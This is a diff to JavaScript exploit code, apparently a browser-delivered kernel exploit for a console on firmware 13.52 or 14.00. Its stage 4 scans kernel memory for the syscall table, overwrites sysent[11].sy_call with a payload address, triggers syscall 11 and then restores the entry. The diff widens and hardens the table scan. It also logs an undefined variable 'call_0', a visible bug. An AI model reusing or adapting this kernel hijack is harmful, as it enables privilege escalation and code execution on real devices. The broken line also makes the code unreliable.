@@ -249,74 +249,94 @@ export async function runKevent(c) {
 
   // --- STAGE 4: HIJACK AND JUMP ---
   
-  // Read payload address from URL or use default 0x2002bc000
   const payloadParam = c.params.get("payload");
-  let payloadAddr;
-  if (payloadParam) {
-    payloadAddr = BigInt(payloadParam);
-  } else {
-    // Default 14.00 payload address
-    payloadAddr = 0x2002bc000n;
-  }
+  const payloadAddr = payloadParam ? BigInt(payloadParam) : 0x2002bc000n;
   STATE.payloadAddr = payloadAddr;
   log("STAGE4-PAYLOAD", "target address=" + h16(payloadAddr));
 
-  // Scan for sysent table around 13.52 offset
-  // On 13.52, sysent[11].sy_call is at P[0] = 0x10EBE88
-  const P0_1352 = 0x10EBE88n;
-  const scanRange = 0x400000n; // +/- 4MB to be safe
-  log("STAGE4-SCAN", "scanning sysent around 0x" + P0_1352.toString(16) + " +/- 0x" + scanRange.toString(16));
+  const SCAN_BASE_START = 0x10000000n;
+  const SCAN_BASE_END = 0x20000000n;
+  log("STAGE4-SCAN", "scanning kernel .data from " + h16(SCAN_BASE_START) + " to " + h16(SCAN_BASE_END));
 
   let sysent11CallAddr = null;
+  let sysent11Base = null;
   let candidates = [];
-  
-  for (let offset = -scanRange; offset <= scanRange; offset += 0x1000n) {
-    const testAddr = STATE.kbase + P0_1352 + offset;
+
+  for (let offset = SCAN_BASE_START; offset < SCAN_BASE_END; offset += 0x1000n) {
+    const testAddr = STATE.kbase + offset;
     try {
-      // sysent[11].sy_call is at sysent_base + 11*0x30 + 8 = +0x210
-      // But we don't know the exact base. Assume the test address is a candidate.
-      const val = p.read8(toI64(testAddr));
-      if (val.hi >>> 0 === 0xffffffff && val.low >>> 0 > 0x100000 && val.low >>> 0 < 0xffffffff) {
-        // Verify by checking sy_narg at -8 (previous 4 bytes are sy_narg)
-        const narg = p.read4(toI64(testAddr - 8n));
-        if (narg >= 0 && narg <= 8) {
-          log("STAGE4-CANDIDATE", "offset=+0x" + offset.toString(16) +
-              " addr=" + h16(testAddr) +
-              " val=" + h16(val) +
-              " narg=" + narg);
-          candidates.push({ offset, addr: testAddr, val, narg });
-          if (!sysent11CallAddr) {
-            sysent11CallAddr = testAddr;
-          }
-        }
+      const sys_narg_0 = p.read4(toI64(testAddr));
+      if (sys_narg_0 !== 0) continue;
+      
+      const sys_call_0 = p.read8(toI64(testAddr + 8n));
+      if (sys_call_0.hi >>> 0 !== 0xffffffff) continue;
+      if (sys_call_0.low >>> 0 < 0x100000) continue;
+      
+      const sysent11 = testAddr + 0x210n;
+      const narg_11 = p.read4(toI64(sysent11));
+      const call_11 = p.read8(toI64(sysent11 + 8n));
+      
+      if (narg_11 < 0 || narg_11 > 8) continue;
+      if (call_11.hi >>> 0 !== 0xffffffff) continue;
+      
+      const sysent661 = testAddr + 0x7B90n;
+      const narg_661 = p.read4(toI64(sysent661));
+      const call_661 = p.read8(toI64(sysent661 + 8n));
+      
+      if (narg_661 < 0 || narg_661 > 8) continue;
+      if (call_661.hi >>> 0 !== 0xffffffff) continue;
+      
+      log("STAGE4-CANDIDATE", 
+          "base=+" + offset.toString(16) +
+          " sysent[0]=" + h16(call_0) +
+          " sysent[11]=" + h16(call_11) + "(narg=" + narg_11 + ")" +
+          " sysent[661]=" + h16(call_661) + "(narg=" + narg_661 + ")");
+      
+      candidates.push({
+        baseOffset: offset,
+        baseAddr: testAddr,
+        sysent11Addr: sysent11 + 8n,
+        sysent661Addr: sysent661 + 8n,
+        call11: call_11,
+        call661: call_661,
+        narg11: narg_11,
+        narg661: narg_661,
+      });
+      
+      if (!sysent11CallAddr) {
+        sysent11CallAddr = sysent11 + 8n;
+        sysent11Base = testAddr;
+      }
+      
+      if (narg_661 >= 2 && narg_661 <= 4) {
+        log("STAGE4-STRONG", "high confidence sysent candidate at base +" + offset.toString(16));
       }
     } catch (e) {}
   }
 
   if (!sysent11CallAddr) {
-    fin("STAGE4-FAIL: no valid sysent[11].sy_call found in scan range");
+    fin("STAGE4-FAIL: no sysent table found in range " + h16(SCAN_BASE_START) + " to " + h16(SCAN_BASE_END) + " (found " + candidates.length + " candidates)");
   }
 
-  log("STAGE4-FOUND", "sysent[11].sy_call at " + h16(sysent11CallAddr) + " (candidates=" + candidates.length + ")");
+  log("STAGE4-FOUND", "sysent base at " + h16(sysent11Base) + " (candidates=" + candidates.length + ")");
 
-  // Save original
-  const orig11Call = p.read8(toI64(sysent11CallAddr));
-  log("STAGE4-ORIG", "orig sy_call=" + orig11Call);
+  const best = candidates[0];
+  log("STAGE4-BEST", "using candidate: sysent[11].sy_call=" + h16(best.call11) + " sysent[661].sy_call=" + h16(best.call661));
 
-  // Hijack
-  p.write8(toI64(sysent11CallAddr), toI64(payloadAddr));
+  const orig11Call = best.call11;
+  log("STAGE4-ORIG", "orig sysent[11].sy_call=" + orig11Call);
+
+  p.write8(toI64(best.sysent11Addr), toI64(payloadAddr));
   log("STAGE4-HIJACK", "wrote " + h16(payloadAddr) + " to sysent[11].sy_call");
 
-  // Verify
-  const readback = p.read8(toI64(sysent11CallAddr));
+  const readback = p.read8(toI64(best.sysent11Addr));
   if (readback.low !== payloadAddr.low || readback.hi !== payloadAddr.hi) {
-    log("STAGE4-FAIL", "hijack did not land: got=" + readback + " want=" + h16(payloadAddr));
-    p.write8(toI64(sysent11CallAddr), orig11Call);
-    fin("sysent hijack failed");
+    log("STAGE4-FAIL", "hijack did not land");
+    p.write8(toI64(best.sysent11Addr), orig11Call);
+    fin("hijack failed");
   }
   log("STAGE4-VERIFIED", "sysent[11].sy_call now points at payload");
 
-  // TRIGGER - call syscall 11
   log("STAGE4-TRIGGER", "calling syscall(11)...");
   try {
     const ret = scn(11);
@@ -325,10 +345,9 @@ export async function runKevent(c) {
     log("STAGE4-TRIGGER-THREW", e.message);
   }
 
-  // Restore
-  p.write8(toI64(sysent11CallAddr), orig11Call);
-  log("STAGE4-RESTORE", "sysent[11].sy_call restored");
+  p.write8(toI64(best.sysent11Addr), orig11Call);
+  log("STAGE4-RESTORE", "restored");
 
   log("STAGE4-DONE", "payload execution attempted at " + h16(payloadAddr));
-  fin("Stage 4 Complete. Payload should be running.");
+  fin("Stage 4 Complete.");
 }
